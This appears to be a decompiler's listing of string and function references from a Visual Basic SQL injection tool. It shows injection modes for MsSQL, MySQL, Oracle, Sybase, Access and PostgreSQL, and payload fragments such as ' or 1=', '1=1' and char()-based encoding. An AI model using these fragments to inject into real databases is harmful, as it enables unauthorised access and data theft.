'N  * ref: "MsSQL with error"
'N  * ref: "MySQL"
'N  * ref: "MySQL >=5"
'N  * ref: "MySQL >=4.1"
'N  * ref: "MySQL unknown ver"
'N  * ref: "MySQL error based"
'N  * ref: Subr_224
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeStr
'End Sub
 
'Sub Subr_179()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaStrCopy
'N  * ref: __vbaStrCmp
'N  * ref: "MSSQL 2000 with error"
'N  * ref: "MSSQL 2005 with error"
'N  * ref: "MsSQL with error"
'N  * ref: "MSSQL no error"
'N  * ref: "MsSQL no error"
'N  * ref: "MsSQL Blind"
'N  * ref: "Sybase (ASE)"
'N  * ref: "MySQL"
'N  * ref: "MySQL >=5"
'N  * ref: "MySQL >=4.1"
'N  * ref: "MySQL unknown ver"
'N  * ref: "Sybase (ASE)"
'N  * ref: Subr_733
'N  * ref: __vbaFreeVar
'N  * ref: Subr_238
'N  * ref: __vbaFreeVar
'N  * ref: Subr_206
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'End Sub
 
'Sub Subr_180()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: "unknown"
'N  * ref: __vbaStrCmp
'N  * ref: "It seems that target is not vulnerable. it's a false positive, Injection Failed!"
'N  * ref: "Database type was not recognized, Injection Failed!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: Left(
'N  * ref: LCase(
'N  * ref: "mssql"
'N  * ref: Right(
'N  * ref: "with error"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_198
'N  * ref: __vbaFreeVar
'N  * ref: "MsSQL no error"
'N  * ref: __vbaStrCmp
'N  * ref: "MSSQL no error"
'N  * ref: Subr_230
'N  * ref: __vbaFreeVar
'N  * ref: "MsSQL time based"
'N  * ref: __vbaStrCmp
'N  * ref: "MsSQL Blind"
'N  * ref: LCase(
'N  * ref: "mssql"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: "Please register to activate!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrComp
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: Subr_692
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrMove
'N  * ref: "Sybase (ASE)"
'N  * ref: __vbaStrCmp
'N  * ref: "Sybase (ASE) Blind"
'N  * ref: __vbaStrCmp
'N  * ref: "Please register to activate!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrComp
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: Subr_692
'N  * ref: __vbaFreeVar
'N  * ref: "Sybase (ASE)"
'N  * ref: __vbaStrCmp
'N  * ref: Subr_726
'N  * ref: __vbaFreeVar
'N  * ref: LCase(
'N  * ref: "mysql"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: Subr_212
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: LCase(
'N  * ref: "mysql"
'N  * ref: "MySQL time based"
'N  * ref: __vbaStrCmp
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_678
'N  * ref: __vbaFreeVar
'N  * ref: "Oracle"
'N  * ref: __vbaStrCmp
'N  * ref: Subr_656
'N  * ref: __vbaFreeVar
'N  * ref: "PostgreSQL"
'N  * ref: "Please register to activate!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrComp
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaStrCopy
'N  * ref: Subr_705
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaErrorOverflow
'End Sub
 
'Sub Subr_181()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: Left(
'N  * ref: LCase(
'N  * ref: "mssql"
'N  * ref: Right(
'N  * ref: "with error"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_207
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarMove
'N  * ref: "MsSQL no error"
'N  * ref: __vbaStrCmp
'N  * ref: "MSSQL no error"
'N  * ref: Subr_239
'N  * ref: "MsSQL time based"
'N  * ref: __vbaStrCmp
'N  * ref: "MsSQL Blind"
'N  * ref: Left(
'N  * ref: LCase(
'N  * ref: "mssql"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: "Please register to activate!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrComp
'N  * ref: Left(
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: Subr_699
'N  * ref: __vbaStrMove
'N  * ref: "Sybase (ASE)"
'N  * ref: __vbaStrCmp
'N  * ref: "Sybase (ASE) Blind"
'N  * ref: __vbaStrCmp
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrComp
'N  * ref: Left(
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: Subr_699
'N  * ref: "Sybase (ASE)"
'N  * ref: __vbaStrCmp
'N  * ref: Subr_734
'N  * ref: Left(
'N  * ref: LCase(
'N  * ref: "mysql"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_225
'N  * ref: Left(
'N  * ref: LCase(
'N  * ref: "mysql"
'N  * ref: "MySQL time based"
'N  * ref: __vbaStrCmp
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_685
'N  * ref: "Oracle"
'N  * ref: __vbaStrCmp
'N  * ref: Subr_663
'N  * ref: "Oracle error based"
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrComp
'N  * ref: Left(
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: Subr_724
'N  * ref: LCase(
'N  * ref: "msaccess"
'N  * ref: "msaccess blind"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_652
'N  * ref: "PostgreSQL"
'N  * ref: __vbaStrCmp
'N  * ref: "Please register to activate!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrComp
'N  * ref: Left(
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: Subr_712
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaErrorOverflow
'End Sub
 
'Sub Subr_182()
'N  * ref: __vbaExceptHandler
'N  * ref: Timer
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarTstLt
'N  * ref: __vbaVarMul
'N  * ref: Timer
'N  * ref: __vbaVarSub
'N  * ref: DoEvents
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub Subr_183()
'N  * ref: __vbaExceptHandler
'N  * ref: "<"
'N  * ref: "&lt;"
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaStrVarVal
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStr
'N  * ref: ">"
'N  * ref: "&gt;"
'N  * ref: """"
'N  * ref: "&quot;"
'N  * ref: "&"
'N  * ref: "&amp;"
'N  * ref: " "
'N  * ref: "&nbsp;"
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeStr
'End Sub
 
'Sub Subr_184()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaVarDup
'N  * ref: "and"
'N  * ref: "or"
'N  * ref: IIf(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'End Sub
 
'Sub Subr_185()
'N  * ref: __vbaExceptHandler
'N  * ref: "999999.9"
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'End Sub
 
'Sub Subr_186()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaStrCopy
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaFreeVar
'N  * ref: Right(
'N  * ref: vbCrLf
'N  * ref: __vbaLenBstr
'N  * ref: Left(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: Left(
'N  * ref: vbCrLf
'N  * ref: __vbaLenBstr
'N  * ref: Right(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: Right(
'N  * ref: vbCr
'N  * ref: __vbaLenBstr
'N  * ref: Left(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: Left(
'N  * ref: vbCr
'N  * ref: __vbaLenBstr
'N  * ref: Right(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: Right(
'N  * ref: vbLf
'N  * ref: __vbaLenBstr
'N  * ref: Left(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: Left(
'N  * ref: vbLf
'N  * ref: __vbaLenBstr
'N  * ref: Right(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: Right(
'N  * ref: vbTab
'N  * ref: __vbaLenBstr
'N  * ref: Left(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: Left(
'N  * ref: vbTab
'N  * ref: __vbaLenBstr
'N  * ref: Right(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: Trim(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeStr
'N  * ref: __vbaErrorOverflow
'End Sub
 
'Sub Subr_187()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaNew
'N  * ref: __vbaObjSet
'N  * ref: "utf-8"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'End Sub
 
'Sub Subr_188()
'N  * ref: __vbaExceptHandler
'N  * ref: StrConv(
'N  * ref: __vbaVar2Vec
'N  * ref: Subr_187
'N  * ref: __vbaStrMove
'N  * ref: __vbaErase
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaAryDestruct
'End Sub
 
'Sub Subr_189()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaNew
'N  * ref: __vbaObjSet
'N  * ref: "utf-8"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVar2Vec
'N  * ref: __vbaAryMove
'N  * ref: __vbaAryDestruct
'N  * ref: __vbaFreeVar
'N  * ref: __vbaAryDestruct
'N  * ref: __vbaFreeObj
'N  * ref: __vbaAryDestruct
'End Sub
 
'Sub Subr_190()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaStrCmp
'N  * ref: Subr_189
'N  * ref: __vbaAryMove
'N  * ref: __vbaUbound
'N  * ref: __vbaVarForInit
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaI4Var
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: Chr(
'N  * ref: __vbaVarCat
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarForNext
'N  * ref: __vbaStrCopy
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaAryDestruct
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'End Sub
 
'Sub Subr_191()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjIs
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub Subr_192()
'N  * ref: __vbaExceptHandler
'N  * ref: "%2B"
'N  * ref: "+"
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaStrVarVal
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStr
'N  * ref: "%20"
'N  * ref: " "
'N  * ref: "%26"
'N  * ref: "&"
'N  * ref: "%3D"
'N  * ref: "="
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeStr
'End Sub
 
'Sub Subr_193()
'N  * ref: __vbaExceptHandler
'N  * ref: " COLLATE SQL_Latin1_General_Cp1254_CS_AS"
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaStrVarCopy
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub Subr_194()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaLenBstr
'N  * ref: "NULL"
'N  * ref: __vbaVarCopy
'N  * ref: __vbaVarForInit
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarCat
'N  * ref: __vbaI4Var
'N  * ref: "char("
'N  * ref: Mid(
'N  * ref: __vbaStrVarVal
'N  * ref: Asc(
'N  * ref: ")%2b"
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarForNext
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarSub
'N  * ref: Left(
'N  * ref: __vbaStrCat
'N  * ref: "'"
'N  * ref: __vbaStrMove
'N  * ref: "'"
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub Subr_195()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: " or 1="
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: " or 1="
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'End Sub
 
'Sub Subr_196()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaVarDup
'N  * ref: " and "
'N  * ref: "("
'N  * ref: ")"
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: "1"
'N  * ref: __vbaVarCat
'N  * ref: "="
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: "("
'N  * ref: ")"
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: __vbaVarCat
'N  * ref: "1=1"
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVarList
'End Sub
 
